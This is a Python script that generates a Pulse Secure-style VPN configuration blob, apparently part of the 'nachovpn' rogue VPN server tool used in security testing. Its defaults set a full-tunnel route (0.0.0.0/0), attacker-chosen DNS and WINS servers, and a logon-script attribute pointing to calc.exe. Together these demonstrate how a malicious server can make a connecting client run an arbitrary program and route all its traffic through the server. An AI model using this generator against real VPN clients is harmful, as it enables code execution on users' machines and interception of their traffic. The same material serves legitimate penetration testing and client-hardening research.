#!/usr/bin/env python3
import os
import struct
import ipaddress

ROUTE_SPLIT_INCLUDE = 0x07000010
ROUTE_SPLIT_EXCLUDE = 0xf1000010

ENC_AES_128_CBC = 2
ENC_AES_256_CBC = 5

HMAC_MD5 = 1
HMAC_SHA1 = 2
HMAC_SHA256 = 3

CFG_DISCONNECT_WHEN_ROUTES_CHANGED = 0x4000
CFG_TUNNEL_ROUTES_TAKE_PRECEDENCE = 0x4001
CFG_TUNNEL_ROUTES_WITH_SUBNET_ACCESS = 0x401f
CFG_ENFORCE_IPV4 = 0x4020
CFG_ENFORCE_IPV6 = 0x4021
CFG_MTU = 0x4005
CFG_DNS_SERVER = 0x0003
CFG_WINS_SERVER = 0x0004
CFG_DNS_SUFFIX = 0x4006
CFG_UNKNOWN_4007 = 0x4007
CFG_UNKNOWN_4019 = 0x4019
CFG_ESP_ONLY = 0x401A
CFG_ESP_ALLOW_6IN4 = 0x4024
CFG_ESP_TO_SSL_FALLBACK_SECS = 0x4017
CFG_UNKNOWN_400F = 0x400F
CFG_ESP_ENC_ALG = 0x4010
CFG_ESP_HMAC_ALG = 0x4011
CFG_ESP_KEY_LIFETIME = 0x4012
CFG_ESP_KEY_BYTES = 0x4013
CFG_ESP_REPLAY_PROTECTION = 0x4014
CFG_TOS_COPY = 0x4015
CFG_ESP_PORT = 0x4016
CFG_UNKNOWN_4018 = 0x4018
CFG_INTERNAL_LEGACY_IP = 0x0001
CFG_NETMASK = 0x0002
CFG_INTERNAL_GATEWAY_IP = 0x400B
CFG_LOGON_SCRIPT = 0x400C
CFG_LOGON_SCRIPT_MAC = 0x401B

EXAMPLE_ROUTES = [
    {'type': ROUTE_SPLIT_INCLUDE, 'route': '0.0.0.0/0.0.0.0'},
    # {'type': ROUTE_SPLIT_EXCLUDE, 'route': '10.0.0.0/255.0.0.0'}
]

class ESPConfigGenerator:
    def create_config(self):
        config = b''
        config += b'\x00' * 0x10                    # padding
        config += 0x21202400.to_bytes(4, 'big')     # marker for ESP config
        config += b'\x00' * 4                       # more padding
        config += 0x70.to_bytes(4, 'big')           # length including header
        config += 0x54.to_bytes(4, 'big')           # ESP config length
        config += b'\x01\x00\x00\x00'               # unknown (always 0x01000000)
        config += os.urandom(4)                     # server->client SPI in little endian
        config += 0x40.to_bytes(2, 'big')           # secrets length
        config += os.urandom(32)                    # AES key (32-bytes for AES-256)
        config += os.urandom(32)                    # HMAC key (32-bytes for SHA-256)
        config += b'\x00' * 6                       # padding
        return config

class VPNConfigGenerator:
    def __init__(self, logon_script="C:\\Windows\\System32\\calc.exe", logon_script_macos="", dns_suffix="nachovpn.local", routes=EXAMPLE_ROUTES, client_ip=None):
        self.logon_script = logon_script
        self.logon_script_macos = logon_script_macos
        self.dns_suffix = dns_suffix
        self.routes = routes
        self.client_ip = client_ip

    @staticmethod
    def hexdump(data, length=16):
        if isinstance(data, str):
            with open(data, 'rb') as f:
                data = f.read()

        def chunk_data(data, size):
            for i in range(0, len(data), size):
                yield data[i:i + size]

        def to_hex(chunk):
            return ' '.join(f'{b:02x}' for b in chunk)

        def to_printable(chunk):
            return ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)

        for i, chunk in enumerate(chunk_data(data, length)):
            hex_data = to_hex(chunk)
            printable_data = to_printable(chunk)
            print(f'{i * length:08x}  {hex_data:<{length * 3}}  |{printable_data}|')

    @staticmethod
    def int_to_ipv4(addr):
        return str(ipaddress.IPv4Address(addr))

    @staticmethod
    def ipv4_to_int(ipv4):
        return int(ipaddress.IPv4Address(ipv4))

    @staticmethod
    def write_le32(value):
        return struct.pack('<I', value)

    @staticmethod
    def write_be32(value):
        return struct.pack('>I', value)

    @staticmethod
    def write_be16(value):
        return struct.pack('>H', value)

    @staticmethod
    def ip_to_bytes(ip):
        return bytes(map(int, ip.split('.')))

    @staticmethod
    def subnet_mask_to_bytes(subnet_mask):
        parts = subnet_mask.split('.')
        return bytes([255 ^ int(part) for part in parts])

    def create_routes(self):
        route_data = b''
        for route in self.routes:
            route_type = route['type']
            ip, subnet_mask = route['route'].split('/')
            ip_bytes = self.ip_to_bytes(ip)
            subnet_mask_bytes = self.subnet_mask_to_bytes(subnet_mask)

            route_entry = self.write_be32(route_type)
            route_entry += self.write_be32(0x0000FFFF)
            route_entry += ip_bytes
            route_entry += subnet_mask_bytes
            route_data += route_entry

        # Calculate routes length
        routes_len = len(route_data) + 8

        # Generate the final routes section
        routes_section = bytearray()
        routes_section += self.write_be16(0x2e00)                    # Attribute flag
        routes_section += self.write_be16(routes_len)                # Routes length
        routes_section += self.write_be32(len(self.routes))          # Number of routes (think this should be big endian)
        routes_section += route_data
        return routes_section

    def create_config(self):
        data = bytearray()
        # Header
        data += self.write_be32(0x00000A4C)          # fixed header value
        data += self.write_be32(0x00000001)          # type: 0x1
        header_len_offset = len(data)
        data += self.write_be32(0)                   # placeholder for length of the whole config
        data += self.write_be32(0x000001FB)          # counter
        data += b'\x00' * 0x10                       # padding

        # Config
        data += self.write_be32(0x2e20f000)          # config for > 9.1R14
        data += self.write_be32(0x00000000)          # fixed value
        config_len_offset = len(data)
        data += self.write_be32(0)                   # placeholder for length: (len(config) - 0x10)

        #logging.debug('config header:')
        #self.hexdump(data)

        # Version marker + attribute
        offset = len(data)
        data += self.write_be16(0x2e00)              # 0x2e00: known for Pulse version >= 9.1R16
        data += self.write_be16(0)                   # placeholder for length
        data += self.write_be32(0x03000000)          # fixed value
        data += self.create_attribute(0x4025, b'\x01')
        data[offset + 2:offset + 4] = self.write_be16(len(data) - offset)

        #logging.debug('version marker + attribute >= 9.1R16:')
        #self.hexdump(data[offset:])

        # Version marker + attribute
        offset = len(data)
        data += self.write_be16(0x2c00)              # 0x2c00: known for Pulse version >= 9.1R14
        data += self.write_be16(0)                   # placeholder for length
        data += self.write_be32(0x03000000)          # fixed value
        data += self.create_attribute(0x4026, b'\x01')
        data[offset + 2:offset + 4] = self.write_be16(len(data) - offset)

        #logging.debug('version marker + attribute >= 9.1R14:')
        #self.hexdump(data[offset:])

        # Routing info
        assert len(data) == 0x46
        data += self.create_routes()

        #logging.debug('routing info:')
        #self.hexdump(data)

        # Final attributes
        # fwiw, openconnect seems to differ here
        final_attrs = bytearray()
        final_attrs += self.write_be32(0)
        final_attrs += self.write_be16(0)            # placeholder: length of the rest of the config
        final_attrs += self.write_be32(0x03000000)   # fixed value
        final_attrs += self.create_attribute(CFG_DISCONNECT_WHEN_ROUTES_CHANGED, b'\x00')
        final_attrs += self.create_attribute(CFG_TUNNEL_ROUTES_TAKE_PRECEDENCE, b'\x01')
        final_attrs += self.create_attribute(CFG_TUNNEL_ROUTES_WITH_SUBNET_ACCESS, b'\x00')
        final_attrs += self.create_attribute(CFG_ENFORCE_IPV4, b'\x01')
        final_attrs += self.create_attribute(CFG_ENFORCE_IPV6, b'\x00')
        final_attrs += self.create_attribute(CFG_MTU, self.write_be32(1400))  # Client interface MTU
        final_attrs += self.create_attribute(CFG_DNS_SERVER, b'\x01\x01\x01\x01')
        final_attrs += self.create_attribute(CFG_DNS_SUFFIX, self.dns_suffix.encode() + b'\x00')
        final_attrs += self.create_attribute(CFG_UNKNOWN_4007, self.write_be32(1))
        final_attrs += self.create_attribute(CFG_WINS_SERVER, b'\x01\x01\x01\x01')
        final_attrs += self.create_attribute(CFG_UNKNOWN_4019, b'\x01')
        final_attrs += self.create_attribute(CFG_ESP_ONLY, b'\x00')
        final_attrs += self.create_attribute(CFG_ESP_ALLOW_6IN4, b'\x00')
        final_attrs += self.create_attribute(CFG_UNKNOWN_400F, b'\x00\x00')
        final_attrs += self.create_attribute(CFG_ESP_ENC_ALG, self.write_be16(ENC_AES_256_CBC))
        final_attrs += self.create_attribute(CFG_ESP_HMAC_ALG, self.write_be16(HMAC_SHA256))
        final_attrs += self.create_attribute(CFG_ESP_KEY_LIFETIME, self.write_be32(1200))
        final_attrs += self.create_attribute(CFG_ESP_KEY_BYTES, self.write_be32(0))
        final_attrs += self.create_attribute(CFG_ESP_REPLAY_PROTECTION, self.write_be32(1))
        final_attrs += self.create_attribute(CFG_TOS_COPY, self.write_be32(0))
        final_attrs += self.create_attribute(CFG_ESP_PORT, self.write_be16(0x1194))
        final_attrs += self.create_attribute(CFG_ESP_TO_SSL_FALLBACK_SECS, self.write_be32(1))
        final_attrs += self.create_attribute(CFG_UNKNOWN_4018, self.write_be32(60))

        # Use allocated IP if provided, otherwise use default
        if self.client_ip:
            final_attrs += self.create_attribute(CFG_INTERNAL_LEGACY_IP, self.write_be32(self.ipv4_to_int(self.client_ip)))
        else:
            final_attrs += self.create_attribute(CFG_INTERNAL_LEGACY_IP, self.write_be32(self.ipv4_to_int("10.10.1.1")))

        final_attrs += self.create_attribute(CFG_NETMASK, self.write_be32(self.ipv4_to_int("255.255.255.255")))
        final_attrs += self.create_attribute(CFG_INTERNAL_GATEWAY_IP, self.write_be32(self.ipv4_to_int("10.10.0.1")))
        final_attrs += self.create_attribute(CFG_LOGON_SCRIPT, self.logon_script.encode() + b'\x00')
        final_attrs += self.create_attribute(0x400d, b'\x00')
        final_attrs += self.create_attribute(0x400e, b'\x00')
        final_attrs += self.create_attribute(CFG_LOGON_SCRIPT_MAC, self.logon_script_macos.encode() + b'\x00')
        final_attrs += self.create_attribute(0x401c, b'\x00')
        final_attrs += self.create_attribute(0x13, b'\x00')
        final_attrs += self.create_attribute(0x14, b'\x00')

        final_attrs[4:6] = self.write_be16(len(final_attrs))  # fill in the length of final attrs
        data += final_attrs  # add final attrs to data

        #logging.debug('final attributes:')
        #self.hexdump(data)

        # Update the lengths
        total_length = len(data)
        data[header_len_offset:header_len_offset + 4] = self.write_be32(total_length)
        data[config_len_offset:config_len_offset + 4] = self.write_be32(total_length - 0x10)

        return data

    @staticmethod
    def create_attribute(attr_type, data):
        return struct.pack('>HH', attr_type, len(data)) + data

def main():
    generator = VPNConfigGenerator()
    config = generator.create_config()
    output_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'test')
    filename = os.path.join(output_dir, 'vpn_config.bin')
    with open(filename, 'wb') as f:
        f.write(config)

    print(f"Generated VPN config. Saved to {filename}")
    generator.hexdump(config)

if __name__ == '__main__':
    main()
